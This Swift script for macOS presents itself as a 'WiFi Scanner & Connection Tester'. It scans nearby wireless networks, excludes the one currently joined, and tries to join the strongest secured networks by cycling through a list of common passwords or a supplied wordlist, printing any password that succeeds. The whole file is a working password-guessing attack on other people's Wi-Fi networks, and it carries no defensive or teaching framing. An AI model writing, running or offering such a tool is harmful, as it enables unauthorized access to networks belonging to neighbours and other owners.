#!/usr/bin/swift

import Foundation

// MARK: - WiFi-Specific Passwords List
let commonPasswords = [
    // 8-digit number patterns (WPA minimum is 8 chars)
    "12345678", "123456789", "1234567890", "87654321", "11111111",
    "00000000", "88888888", "12341234", "11223344", "99999999",
    "66666666", "77777777", "55555555", "44444444", "33333333",
    "22222222", "98765432", "13572468", "24681357", "11112222",
    "12121212", "10101010", "20202020", "01234567", "76543210",

    // Common Indian words
    "namaste123", "diwali123", "krishna1", "shiva1234", "ganesh123",
    "mumbai123", "delhi1234", "india1234", "bharat123", "jai12345",

    // // Repeated patterns
    // "abcdabcd", "testtest", "passpass", "wifiwifi", "homehome",
    // "netnet123", "useruser", "adminadmin", "rootroot", "supersafe",

    // // Simple substitutions
    // "p@ssword", "p@ssw0rd", "passw0rd1", "w1f1pass", "s3cur1ty",
    // "pr1vat3", "n3tw0rk", "w1r3l3ss", "1nt3rn3t", "h0m3w1f1",

    // // Common WiFi passwords
    // "password", "password1", "password12", "password123", "password1234",
    // "wifi1234", "wifi12345", "wifi123456", "wifipass", "wifipassword",
    // "wireless", "wireless1", "wirelessnet", "mywifi123", "homewifi1",

    // // Home/Family themed
    // "home1234", "homewifi", "homenet1", "myhome123", "sweethome",
    // "family123", "myfamily1", "ourhouse1", "welcome1", "welcome123",
    // "guest1234", "guestwifi", "visitors1", "internet1", "myinternet",

    // // Router brand defaults
    // "admin1234", "admin12345", "netgear1", "netgear123", "linksys1",
    // "linksys123", "dlink1234", "tplink1234", "aboram123", "router123",
    // "belkin1234", "cisco1234", "asus1234", "default1", "defaultpass",

    // // ISP default patterns (India)
    // "airtel123", "airtel1234", "jiofiber1", "jio12345", "act12345",
    // "actfibernet", "bsnl1234", "tatasky1", "hathway123", "tikona123",
    // "youbroadband", "spectranet", "excitel123", "railwire1",

    // // ISP default patterns (Global)
    // "spectrum1", "xfinity123", "comcast123", "verizon123", "att12345",
    // "tmobile123", "frontier1", "cox12345", "optimum123", "century1",
    // "btinternet", "skywifi123", "virgin123", "talktalk1", "plusnet1",

    // // Simple word + number combos
    // "qwerty123", "qwerty1234", "qwertyui", "asdfghjk", "zxcvbnm1",
    // "abcd1234", "abcdefgh", "abc12345", "test1234", "testing123",
    // "temp1234", "pass1234", "passw0rd", "p@ssw0rd", "letmein1",

    // // Mobile number patterns (common in India)
    // "9876543210", "1234567890", "9999999999", "8888888888", "7777777777",
    // "9898989898", "9191919191", "9090909090", "8080808080", "7070707070",

    // // Names + numbers (generic)
    // "rahul1234", "amit12345", "kumar1234", "singh1234", "sharma123",
    // "raj12345", "ravi1234", "suresh123", "ramesh123", "mahesh123",
    // "john1234", "mike1234", "david1234", "james1234", "robert123",

    // // Security themed
    // "secure123", "security1", "private1", "private123", "secret123",
    // "mysecret1", "access123", "connect1", "network1", "mynetwork",

    // // Year-based passwords
    // "wifi2020", "wifi2021", "wifi2022", "wifi2023", "wifi2024", "wifi2025",
    // "home2020", "home2021", "home2022", "home2023", "home2024", "home2025",
    // "pass2020", "pass2021", "pass2022", "pass2023", "pass2024", "pass2025",

    // // Keyboard patterns
    // "qwer1234", "asdf1234", "zxcv1234", "1qaz2wsx", "qazwsx123",
    // "1q2w3e4r", "4r3e2w1q", "zaq12wsx", "xsw21qaz", "!qaz2wsx",
]

// MARK: - Signal Handling
var shouldExit = false

func setupSignalHandler() {
    signal(SIGINT) { _ in
        print("\n\nInterrupted by user (Ctrl+C). Exiting...")
        shouldExit = true
        exit(130)
    }
    signal(SIGTERM) { _ in
        print("\n\nTerminated. Exiting...")
        shouldExit = true
        exit(143)
    }
}

// MARK: - Network Structure
struct Network {
    var ssid: String
    var channel: String
    var frequency: String
    var security: String
    var signal: Int
    var noise: Int
}

// MARK: - Helper Functions
func printUsage() {
    print(
        """
        WiFi Scanner & Connection Tester

        Usage: ./wifi-scan.swift [options]

        Options:
            -n, --number <N>     Number of top networks to try (default: 3)
            -k, --ssids <list>   Comma-separated list of SSIDs to process (e.g., "my net,another ssid")
            -i, --interactive    Interactively select networks to process
            -s, --scan           Scan only, don't attempt connections
            -p, --passwords <file>  Use custom password file (one password per line)
            -t, --timeout <sec>  Connection timeout in seconds (default: 5)
            -v, --verbose        Verbose output
            -h, --help           Show this help message

        Examples:
            ./wifi-scan.swift                    # Scan and try top 3 networks
            ./wifi-scan.swift -n 5               # Try top 5 networks
            ./wifi-scan.swift -k "my net,another ssid"  # Try specific networks
            ./wifi-scan.swift -i                 # Scan and interactively select networks
            ./wifi-scan.swift -s                 # Scan only
            ./wifi-scan.swift -p passwords.txt  # Use custom password list
        """)
}

func scanNetworks() -> [Network] {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/sbin/system_profiler")
    process.arguments = ["SPAirPortDataType"]

    let pipe = Pipe()
    process.standardOutput = pipe
    process.standardError = FileHandle.nullDevice

    do {
        try process.run()
        process.waitUntilExit()

        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        guard let output = String(data: data, encoding: .utf8) else {
            return []
        }

        var networks: [Network] = []
        var currentSSID: String?
        var currentChannel: String?
        var currentFrequency: String?
        var currentSecurity: String?
        var currentSignal: Int?
        var currentNoise: Int?
        var inNetworkSection = false
        var inMainInterface = false

        let lines = output.components(separatedBy: "\n")
        for line in lines {
            let trimmed = line.trimmingCharacters(in: .whitespaces)

            // Track when we're in the main WiFi interface (en0)
            if trimmed.hasPrefix("en") && trimmed.hasSuffix(":") && trimmed.count < 6 {
                inMainInterface = true
                inNetworkSection = false
                continue
            }

            // Stop parsing when we hit another interface section (awdl0, llw0)
            if line.contains("awdl0:") || line.contains("llw0:") {
                // Save the last network before stopping
                if let ssid = currentSSID {
                    networks.append(
                        Network(
                            ssid: ssid,
                            channel: currentChannel ?? "?",
                            frequency: currentFrequency ?? "?",
                            security: currentSecurity ?? "Unknown",
                            signal: currentSignal ?? -100,
                            noise: currentNoise ?? -100
                        ))
                }
                break
            }

            // Only process if we're in the main interface
            guard inMainInterface else { continue }

            // Track when we enter any network listing section
            if trimmed == "Other Local Wi-Fi Networks:" || trimmed == "Current Network Information:"
                || trimmed == "Local Wi-Fi Networks:"
            {
                inNetworkSection = true
                continue
            }

            // Check for network name (ends with : and no other key-value pattern)
            // Network names are indented and end with colon but don't contain ": "
            if inNetworkSection && trimmed.hasSuffix(":") && !trimmed.contains(": ") {
                // Save previous network if exists
                if let ssid = currentSSID {
                    networks.append(
                        Network(
                            ssid: ssid,
                            channel: currentChannel ?? "?",
                            frequency: currentFrequency ?? "?",
                            security: currentSecurity ?? "Unknown",
                            signal: currentSignal ?? -100,
                            noise: currentNoise ?? -100
                        ))
                }
                currentSSID = String(trimmed.dropLast())
                currentChannel = nil
                currentFrequency = nil
                currentSecurity = nil
                currentSignal = nil
                currentNoise = nil
                continue
            }

            if currentSSID != nil {
                if trimmed.hasPrefix("Channel:") {
                    let parts = trimmed.replacingOccurrences(of: "Channel:", with: "")
                        .trimmingCharacters(in: .whitespaces)
                    if let channelNum = parts.split(separator: " ").first {
                        currentChannel = String(channelNum)
                    }
                    if parts.contains("5GHz") {
                        currentFrequency = "5GHz"
                    } else if parts.contains("2GHz") {
                        currentFrequency = "2.4GHz"
                    }
                } else if trimmed.hasPrefix("Security:") {
                    currentSecurity = trimmed.replacingOccurrences(of: "Security:", with: "")
                        .trimmingCharacters(in: .whitespaces)
                } else if trimmed.hasPrefix("Signal / Noise:") || trimmed.hasPrefix("Signal/Noise:")
                {
                    let parts = trimmed.replacingOccurrences(of: "Signal / Noise:", with: "")
                        .replacingOccurrences(of: "Signal/Noise:", with: "")
                        .trimmingCharacters(in: .whitespaces)
                    let values = parts.split(separator: "/")
                    if values.count >= 2 {
                        let signalStr = values[0].trimmingCharacters(in: .whitespaces)
                            .replacingOccurrences(of: " dBm", with: "")
                        let noiseStr = values[1].trimmingCharacters(in: .whitespaces)
                            .replacingOccurrences(of: " dBm", with: "")
                        currentSignal = Int(signalStr)
                        currentNoise = Int(noiseStr)
                    }
                }
            }
        }

        // Don't forget to save the last network if we didn't hit a break condition
        if let ssid = currentSSID {
            networks.append(
                Network(
                    ssid: ssid,
                    channel: currentChannel ?? "?",
                    frequency: currentFrequency ?? "?",
                    security: currentSecurity ?? "Unknown",
                    signal: currentSignal ?? -100,
                    noise: currentNoise ?? -100
                ))
        }

        // Sort by signal strength (higher/less negative is better)
        networks.sort { $0.signal > $1.signal }
        return networks

    } catch {
        return []
    }
}

func getWiFiInterface() -> String? {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/sbin/networksetup")
    process.arguments = ["-listallhardwareports"]

    let pipe = Pipe()
    process.standardOutput = pipe
    process.standardError = FileHandle.nullDevice

    do {
        try process.run()
        process.waitUntilExit()

        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        guard let output = String(data: data, encoding: .utf8) else { return nil }

        let lines = output.components(separatedBy: "\n")
        var foundWiFi = false
        for line in lines {
            if line.contains("Wi-Fi") || line.contains("AirPort") {
                foundWiFi = true
                continue
            }
            if foundWiFi && line.contains("Device:") {
                let device = line.replacingOccurrences(of: "Device:", with: "").trimmingCharacters(
                    in: .whitespaces)
                return device
            }
        }
    } catch {
        return nil
    }
    return nil
}

func tryConnect(ssid: String, password: String, interface: String, timeout: Int, verbose: Bool)
    -> Bool
{
    let command = "/usr/sbin/networksetup"
    let args = ["-setairportnetwork", interface, ssid, password]

    let process = Process()
    process.executableURL = URL(fileURLWithPath: command)
    process.arguments = args

    let pipe = Pipe()
    let errorPipe = Pipe()
    process.standardOutput = pipe
    process.standardError = errorPipe

    do {
        try process.run()

        // Wait with timeout
        let deadline = Date().addingTimeInterval(Double(timeout))
        while process.isRunning && Date() < deadline {
            Thread.sleep(forTimeInterval: 0.1)
        }

        if process.isRunning {
            process.terminate()
            if verbose {
                print("      Connection timed out")
            }
            return false
        }

        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        let output = String(data: data, encoding: .utf8) ?? ""
        let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
        let errorOutput = String(data: errorData, encoding: .utf8) ?? ""

        // Check if the command itself succeeded (no immediate errors)
        if process.terminationStatus == 0 && !output.lowercased().contains("error")
            && !errorOutput.lowercased().contains("error")
        {
            // Sleep a bit to allow connection to establish or fail
            Thread.sleep(forTimeInterval: 2.0)

            if testWifiConnectivity() {
                return true
            }
        }

        if verbose && !errorOutput.isEmpty {
            print("      Error: \(errorOutput.trimmingCharacters(in: .whitespacesAndNewlines))")
        }

    } catch {
        if verbose {
            print("      Failed to execute: \(error)")
        }
    }

    return false
}

func getCurrentNetworkFromSystemProfiler() -> String? {
    let command = "/usr/sbin/system_profiler"
    let args = ["SPAirPortDataType"]

    let process = Process()
    process.executableURL = URL(fileURLWithPath: command)
    process.arguments = args

    let pipe = Pipe()
    process.standardOutput = pipe
    process.standardError = FileHandle.nullDevice

    do {
        try process.run()
        process.waitUntilExit()

        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        guard let output = String(data: data, encoding: .utf8) else { return nil }

        let lines = output.components(separatedBy: "\n")
        var inCurrentNetwork = false

        for line in lines {
            let trimmed = line.trimmingCharacters(in: .whitespaces)

            if trimmed == "Current Network Information:" {
                inCurrentNetwork = true
                continue
            }

            // Stop when we hit other sections
            if trimmed == "Other Local Wi-Fi Networks:" || trimmed == "Local Wi-Fi Networks:"
                || line.contains("awdl0:") || line.contains("llw0:")
            {
                break
            }

            if inCurrentNetwork && trimmed.hasSuffix(":") && !trimmed.contains(": ") {
                // This should be the network name
                return String(trimmed.dropLast())
            }
        }
    } catch {
        return nil
    }
    return nil
}

func testWifiConnectivity() -> Bool {
    return getCurrentNetworkFromSystemProfiler() != nil
}

func printNetworkTable(_ networks: [Network], highlight: Int? = nil) {
    print("\nSSID                           RSSI CHAN  FREQ   SECURITY")
    print(String(repeating: "-", count: 80))

    for (index, network) in networks.enumerated() {
        let prefix =
            (highlight != nil && index < highlight!) ? "✓ " : (index == highlight ? "→ " : "  ")
        let ssidPadded =
            network.ssid + String(repeating: " ", count: max(0, 28 - network.ssid.count))
        let rssiStr = String(network.signal)
        let rssiPadded = String(repeating: " ", count: max(0, 4 - rssiStr.count)) + rssiStr
        let channelPadded =
            network.channel + String(repeating: " ", count: max(0, 5 - network.channel.count))
        let freqPadded =
            network.frequency + String(repeating: " ", count: max(0, 6 - network.frequency.count))
        print(
            "\(prefix)\(ssidPadded) \(rssiPadded) \(channelPadded) \(freqPadded) \(network.security)"
        )
    }
}

func selectNetworksInteractively(_ networks: [Network]) -> [Network] {
    print("\nInteractive Network Selection")
    print("Enter the numbers of networks to process (comma-separated, e.g., 1,3,5)")
    print("Or 'all' to select all networks, 'top5' for top 5, etc.")
    print("Or press Enter for top 3 networks:")

    while true {
        print("Selection: ", terminator: "")
        fflush(stdout)

        guard let input = readLine()?.trimmingCharacters(in: .whitespacesAndNewlines),
            !input.isEmpty
        else {
            // Default to top 3
            return Array(networks.prefix(3))
        }

        if input.lowercased() == "all" {
            return networks
        }

        if input.lowercased().hasPrefix("top") {
            let numStr = String(input.dropFirst(3).trimmingCharacters(in: .whitespaces))
            if let num = Int(numStr), num > 0 {
                return Array(networks.prefix(num))
            }
        }

        let indices = input.split(separator: ",").compactMap {
            Int($0.trimmingCharacters(in: .whitespaces))
        }
        let validIndices = indices.filter { $0 >= 1 && $0 <= networks.count }

        if validIndices.isEmpty {
            print("No valid selections. Please try again.")
            continue
        }

        let selectedNetworks = validIndices.map { networks[$0 - 1] }
        print("Selected \(selectedNetworks.count) network(s):")
        for network in selectedNetworks {
            print("  - \(network.ssid)")
        }
        return selectedNetworks
    }
}

func loadPasswordsFromFile(_ path: String) -> [String]? {
    do {
        let content = try String(contentsOfFile: path, encoding: .utf8)
        let passwords = content.components(separatedBy: .newlines).filter { !$0.isEmpty }
        return passwords
    } catch {
        print("Error reading password file: \(error)")
        return nil
    }
}

// MARK: - Main Program

// Setup signal handlers for Ctrl+C
setupSignalHandler()

// Parse command line arguments
var numberOfNetworks = 3
var scanOnly = false
var interactive = false
var customPasswordFile: String? = nil
var timeout = 15
var verbose = false
var specifiedSSIDs: [String]? = nil

var args = Array(CommandLine.arguments.dropFirst())
var i = 0
while i < args.count {
    switch args[i] {
    case "-n", "--number":
        i += 1
        if i < args.count, let n = Int(args[i]) {
            numberOfNetworks = n
        }
    case "-k", "--ssids":
        i += 1
        if i < args.count {
            specifiedSSIDs = args[i].split(separator: ",").map {
                $0.trimmingCharacters(in: .whitespaces)
            }
        }
    case "-i", "--interactive":
        interactive = true
    case "-s", "--scan":
        scanOnly = true
    case "-p", "--passwords":
        i += 1
        if i < args.count {
            customPasswordFile = args[i]
        }
    case "-t", "--timeout":
        i += 1
        if i < args.count, let t = Int(args[i]) {
            timeout = t
        }
    case "-v", "--verbose":
        verbose = true
    case "-h", "--help":
        printUsage()
        exit(0)
    default:
        if args[i].hasPrefix("-") {
            print("Unknown option: \(args[i])")
            printUsage()
            exit(1)
        }
    }
    i += 1
}

// Load passwords
var passwords = commonPasswords
if let file = customPasswordFile {
    if let customPasswords = loadPasswordsFromFile(file) {
        passwords = customPasswords
        print("Loaded \(passwords.count) passwords from \(file)")
    } else {
        exit(1)
    }
}

print("WiFi Scanner & Connection Tester")
print("================================\n")
print("Scanning for available Wi-Fi networks...")

// let ok = tryConnect(ssid: "pxl", password: "lovemeplease", interface: "en0", timeout: 15, verbose: true)
// print(ok)

let networks = scanNetworks()

if networks.isEmpty {
    print("No networks found.")
    exit(1)
}

print("Found \(networks.count) networks")
printNetworkTable(networks)

if scanOnly {
    if let ssids = specifiedSSIDs {
        let matchingNetworks = networks.filter { ssids.contains($0.ssid) }
        if matchingNetworks.isEmpty {
            print(
                "\nNo networks found matching the specified SSIDs: \(ssids.joined(separator: ", "))"
            )
        } else {
            print("\nNetworks matching specified SSIDs:")
            printNetworkTable(matchingNetworks)
        }
    }
    print("\nScan complete. Use without -s flag to attempt connections.")
    exit(0)
}

// Get WiFi interface
guard let wifiInterface = getWiFiInterface() else {
    print("\nError: Could not find WiFi interface")
    exit(1)
}

if verbose {
    print("\nUsing WiFi interface: \(wifiInterface)")
}

// Get currently connected network ssid
let currentNetwork = getCurrentNetworkFromSystemProfiler()
if let current = currentNetwork {
    print("\nCurrently connected to: \(current) (will be excluded from testing)")
}

// Filter out currently connected network
let candidateNetworks = networks.filter { $0.ssid != currentNetwork }

// Select networks to process
let targetNetworks: [Network]
if let ssids = specifiedSSIDs {
    // Filter networks by specified SSIDs
    targetNetworks = candidateNetworks.filter { network in
        ssids.contains(network.ssid)
    }
    if targetNetworks.isEmpty {
        print(
            "\nNo matching networks found for the specified SSIDs: \(ssids.joined(separator: ", "))"
        )
        exit(1)
    }
    print("\nSelected \(targetNetworks.count) network(s) matching specified SSIDs:")
    for network in targetNetworks {
        print("  - \(network.ssid)")
    }
} else if interactive {
    targetNetworks = selectNetworksInteractively(candidateNetworks)
} else {
    targetNetworks = Array(candidateNetworks.prefix(numberOfNetworks))
}

if targetNetworks.isEmpty {
    print("\nNo candidate networks to test (all networks are either connected or excluded).")
    exit(0)
}

print("\n" + String(repeating: "=", count: 80))
print("Attempting to connect to \(targetNetworks.count) selected network(s)...")
print("Using \(passwords.count) common passwords")
print("Timeout: \(timeout) seconds per attempt")
print(String(repeating: "=", count: 80))

var successfulConnections: [(network: Network, password: String)] = []

for (networkIndex, network) in targetNetworks.enumerated() {
    print(
        "\n[\(networkIndex + 1)/\(targetNetworks.count)] Trying: \(network.ssid) (Signal: \(network.signal) dBm)"
    )
    print("    Security: \(network.security)")

    // Skip open networks
    if network.security.lowercased().contains("none")
        || network.security.lowercased().contains("open")
    {
        continue
    }

    var connected = false
    for (passIndex, password) in passwords.enumerated() {
        if verbose {
            print("    [\(passIndex + 1)/\(passwords.count)] Trying: \(password)")
        } else {
            // Progress indicator
            if passIndex % 10 == 0 {
                print(
                    "    Progress: \(passIndex)/\(passwords.count) passwords tested...",
                    terminator: "\r")
                fflush(stdout)
            }
        }

        if tryConnect(
            ssid: network.ssid, password: password, interface: wifiInterface, timeout: timeout,
            verbose: verbose)
        {
            print(
                "\n    ✓ SUCCESS! Connected with password: \(password.isEmpty ? "(empty)" : password)"
            )
            successfulConnections.append((network: network, password: password))
            connected = true
            break
        }
    }

    if connected {
        break
    }
}
